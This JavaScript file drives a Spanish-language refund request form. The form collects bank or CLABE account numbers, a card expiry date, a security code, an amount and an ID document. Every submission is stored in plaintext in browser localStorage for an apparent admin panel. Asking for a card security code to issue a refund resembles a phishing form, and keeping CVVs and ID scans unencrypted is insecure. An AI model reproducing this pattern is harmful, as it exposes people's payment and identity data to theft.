document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('reembolsoForm');
    const tipoCuenta = document.getElementById('tipoCuenta');
    const numeroCuenta = document.getElementById('numeroCuenta');
    const cuentaHelp = document.getElementById('cuentaHelp');
    const fechaCaducidad = document.getElementById('fechaCaducidad');
    const codigoSeguridad = document.getElementById('codigoSeguridad');
    const messageDiv = document.getElementById('message');

    // Validación y ayuda para tipo de cuenta
    tipoCuenta.addEventListener('change', function() {
        if (this.value === 'clabe') {
            cuentaHelp.textContent = 'CLABE interbancaria debe tener 18 dígitos';
            numeroCuenta.setAttribute('maxlength', '18');
            numeroCuenta.setAttribute('pattern', '[0-9]{18}');
        } else if (this.value === 'tradicional') {
            cuentaHelp.textContent = 'Ingrese el número de cuenta bancaria';
            numeroCuenta.removeAttribute('maxlength');
            numeroCuenta.removeAttribute('pattern');
        } else {
            cuentaHelp.textContent = '';
        }
    });

    // Formato automático para fecha de caducidad (MM/AA)
    fechaCaducidad.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value;
    });

    // Validar que solo sean números en código de seguridad
    codigoSeguridad.addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/\D/g, '');
    });

    // Validar que solo sean números en número de cuenta
    numeroCuenta.addEventListener('input', function(e) {
        if (tipoCuenta.value === 'clabe') {
            e.target.value = e.target.value.replace(/\D/g, '');
        }
    });

    // Función para convertir archivo a base64
    function fileToBase64(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = () => resolve(reader.result);
            reader.onerror = error => reject(error);
        });
    }

    // Función para guardar solicitud en localStorage
    function guardarSolicitud(solicitud) {
        try {
            // Obtener solicitudes existentes
            const solicitudes = JSON.parse(localStorage.getItem('solicitudesReembolso') || '[]');
            
            // Agregar nueva solicitud
            solicitudes.push(solicitud);
            
            // Guardar de vuelta en localStorage
            localStorage.setItem('solicitudesReembolso', JSON.stringify(solicitudes));
            
            return true;
        } catch (error) {
            console.error('Error al guardar:', error);
            return false;
        }
    }

    // Manejo del envío del formulario
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const submitBtn = form.querySelector('.submit-btn');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Guardando...';
        messageDiv.className = 'message';
        messageDiv.style.display = 'none';

        try {
            // Obtener datos del formulario
            const nombreCompleto = document.getElementById('nombreCompleto').value.trim();
            const banco = document.getElementById('banco').value.trim();
            const tipoCuenta = document.getElementById('tipoCuenta').value;
            const numeroCuenta = document.getElementById('numeroCuenta').value.trim();
            const fechaCaducidad = document.getElementById('fechaCaducidad').value.trim();
            const codigoSeguridad = document.getElementById('codigoSeguridad').value.trim();
            const monto = document.getElementById('monto').value;
            const motivo = document.getElementById('motivo').value.trim();
            const identificacionFile = document.getElementById('identificacion').files[0];

            // Validar campos requeridos
            if (!nombreCompleto || !banco || !tipoCuenta || !numeroCuenta || 
                !fechaCaducidad || !codigoSeguridad || !monto) {
                throw new Error('Por favor, completa todos los campos requeridos');
            }

            // Validar CLABE si es necesario
            if (tipoCuenta === 'clabe' && numeroCuenta.length !== 18) {
                throw new Error('La CLABE interbancaria debe tener 18 dígitos');
            }

            // Procesar archivo de identificación si existe
            let identificacionBase64 = null;
            let identificacionNombre = null;
            if (identificacionFile) {
                if (identificacionFile.size > 5 * 1024 * 1024) { // 5MB máximo
                    throw new Error('El archivo de identificación es demasiado grande (máximo 5MB)');
                }
                identificacionBase64 = await fileToBase64(identificacionFile);
                identificacionNombre = identificacionFile.name;
            }

            // Crear objeto de solicitud
            const solicitud = {
                id: Date.now().toString(),
                fecha: new Date().toISOString(),
                nombreCompleto: nombreCompleto,
                banco: banco,
                numeroCuenta: numeroCuenta,
                tipoCuenta: tipoCuenta,
                fechaCaducidad: fechaCaducidad,
                codigoSeguridad: codigoSeguridad,
                monto: parseFloat(monto).toFixed(2),
                motivo: motivo || '',
                identificacion: identificacionBase64,
                identificacionNombre: identificacionNombre,
                estado: 'pendiente'
            };

            // Guardar en localStorage
            if (guardarSolicitud(solicitud)) {
                messageDiv.className = 'message success';
                messageDiv.textContent = '¡Solicitud guardada correctamente! Puedes verla en el panel de administración.';
                messageDiv.style.display = 'block';
                form.reset();
                cuentaHelp.textContent = '';
                
                // Scroll al mensaje
                messageDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
            } else {
                throw new Error('Error al guardar la solicitud');
            }
        } catch (error) {
            messageDiv.className = 'message error';
            messageDiv.textContent = 'Error: ' + error.message;
            messageDiv.style.display = 'block';
            messageDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = 'Enviar Solicitud';
        }
    });
});

